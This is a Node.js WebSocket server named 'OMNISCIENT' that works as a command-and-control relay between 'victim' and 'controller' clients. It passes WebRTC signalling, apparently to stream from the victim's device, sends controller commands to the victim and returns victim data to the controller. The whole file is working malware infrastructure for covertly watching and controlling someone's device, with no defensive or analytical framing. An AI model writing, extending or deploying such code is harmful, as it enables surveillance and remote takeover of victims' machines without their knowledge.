const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.static(path.join(__dirname, 'public')));

const rooms = new Map();

wss.on('connection', (ws) => {
    let roomId = null;
    let role = null;

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);

            switch (data.type) {
                case 'join': {
                    roomId = data.room;
                    role = data.role;
                    if (!rooms.has(roomId)) {
                        rooms.set(roomId, { victimWs: null, controllerWs: null, victimOffer: null, controllerAnswer: null });
                    }
                    const room = rooms.get(roomId);
                    if (role === 'victim') {
                        room.victimWs = ws;
                    } else if (role === 'controller') {
                        room.controllerWs = ws;
                    }
                    ws.roomId = roomId;
                    ws.role = role;
                    ws.send(JSON.stringify({ type: 'joined', role }));
                    break;
                }

                case 'webrtc_offer': {
                    if (role === 'victim') {
                        const room = rooms.get(roomId);
                        if (room) {
                            room.victimOffer = data.offer;
                            if (room.controllerWs && room.controllerWs.readyState === WebSocket.OPEN) {
                                room.controllerWs.send(JSON.stringify({
                                    type: 'webrtc_offer',
                                    offer: data.offer
                                }));
                            }
                        }
                    }
                    break;
                }

                case 'webrtc_answer': {
                    if (role === 'controller') {
                        const room = rooms.get(roomId);
                        if (room) {
                            room.controllerAnswer = data.answer;
                            if (room.victimWs && room.victimWs.readyState === WebSocket.OPEN) {
                                room.victimWs.send(JSON.stringify({
                                    type: 'webrtc_answer',
                                    answer: data.answer
                                }));
                            }
                        }
                    }
                    break;
                }

                case 'webrtc_ice': {
                    const room = rooms.get(roomId);
                    if (room) {
                        const target = (role === 'victim') ? room.controllerWs : room.victimWs;
                        if (target && target.readyState === WebSocket.OPEN) {
                            target.send(JSON.stringify({
                                type: 'webrtc_ice',
                                candidate: data.candidate
                            }));
                        }
                    }
                    break;
                }

                case 'command': {
                    if (role === 'controller') {
                        const room = rooms.get(roomId);
                        if (room && room.victimWs && room.victimWs.readyState === WebSocket.OPEN) {
                            room.victimWs.send(JSON.stringify({
                                type: 'command',
                                payload: data.payload
                            }));
                        }
                    }
                    break;
                }

                case 'info': {
                    if (role === 'victim') {
                        const room = rooms.get(roomId);
                        if (room && room.controllerWs && room.controllerWs.readyState === WebSocket.OPEN) {
                            room.controllerWs.send(JSON.stringify({
                                type: 'info',
                                data: data.data
                            }));
                        }
                    }
                    break;
                }

                default:
                    break;
            }
        } catch (e) {
            // ignore malformed JSON
        }
    });

    ws.on('close', () => {
        if (roomId && rooms.has(roomId)) {
            const room = rooms.get(roomId);
            if (room.victimWs === ws) room.victimWs = null;
            if (room.controllerWs === ws) room.controllerWs = null;
            if (!room.victimWs && !room.controllerWs) {
                rooms.delete(roomId);
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 OMNISCIENT server running on port ${PORT}`);
});
